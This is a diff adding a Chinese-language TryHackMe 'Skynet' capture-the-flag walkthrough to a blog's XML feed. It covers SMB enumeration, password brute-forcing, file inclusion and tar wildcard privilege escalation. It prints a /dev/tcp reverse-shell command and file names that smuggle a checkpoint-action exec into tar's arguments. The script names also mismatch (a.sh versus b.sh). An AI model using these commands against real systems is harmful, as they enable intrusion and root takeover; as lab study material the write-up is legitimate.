@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>Skynet</title>
+    <link href="/2024/11/08/Skynet/"/>
+    <url>/2024/11/08/Skynet/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Skynet"><a href="#Skynet" class="headerlink" title="Skynet"></a>Skynet</h1><p>扫一下端口。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081707907.png" alt="image-20241108170732818"></p><p>44 80 22 等端口开放，看下80端口。</p><p>扫下后台找到登录的地方，尝试爆破密码，结果没结果。</p><p>回到445端口，利用enum4linux探测一下samba服务。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081719421.png" alt="image-20241108171939346"></p><p>用smbclient 去登录anonymous 这个是无密码的。</p><p>进入logs下有三个日志文件。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081731951.png" alt="image-20241108173147913"></p><p>利用more命令进行查看。</p><p>只有log1.txt里面有文件。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure><p>可能是字典？试一下。</p><p>管理员名字并不是admin 而是 Miles Dyson</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081754727.png" alt="image-20241108175413621"></p><p>得到密码之后登录。</p><p>在邮件里面找到milesdyson的smb登录密码。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">50.223</span>/milesdyson -U milesdyson<br></code></pre></td></tr></table></figure><p>然后找到了下面这个</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> <span class="hljs-keyword">Add</span> features <span class="hljs-keyword">to</span> beta CMS /<span class="hljs-number">45</span>kra24zxs28v3yd<br><span class="hljs-number">2.</span> <span class="hljs-keyword">Work</span> <span class="hljs-keyword">on</span> T<span class="hljs-number">-800</span> Model <span class="hljs-number">101</span> blueprints<br><span class="hljs-number">3.</span> Spend more <span class="hljs-type">time</span> <span class="hljs-keyword">with</span> my wife<br></code></pre></td></tr></table></figure><p>去访问一下/45kra24zxs28v3yd</p><p>发现没啥东西，后台扫一下。能扫到又是一个新的cms.</p><p>找到一个文件包含漏洞，在本地写一个shell，然后去包含一下，进行一个反弹shell.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081842564.png" alt="image-20241108184257438"></p><p>下面就是提权了。</p><p>就是一个计划任务提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081855926.png" alt="image-20241108185542856"></p><p>我想的是修改backup.sh 以root身份运行，但是这个backup.sh没权限操作。</p><p>这里看了一下wp 说是tar通配符注入进行提权。</p><p>就是不合理使用*(通配符)，从而导致攻击者可以利用这个来进行提权。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081922978.png" alt="image-20241108192256910"></p><p>这个sh文件要执行的是切换到web服务器根目录下，将当前所有的文件和文件夹打包到指定的压缩包里面。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/var/www/html</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sh -i &gt;&amp; /dev/tcp/10.14.74.6/4444 0&gt;&amp;1&quot;</span> &gt; a.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=bash b.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-params">--checkpoint=1</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082019254.png" alt="image-20241108201927143"></p><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/system/176255">https://www.freebuf.com/articles/system/176255</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Offensive Pentesting</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>tryhackme</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>gamezome</title>
     <link href="/2024/11/04/Game%20Zone/"/>
     <url>/2024/11/04/Game%20Zone/</url>
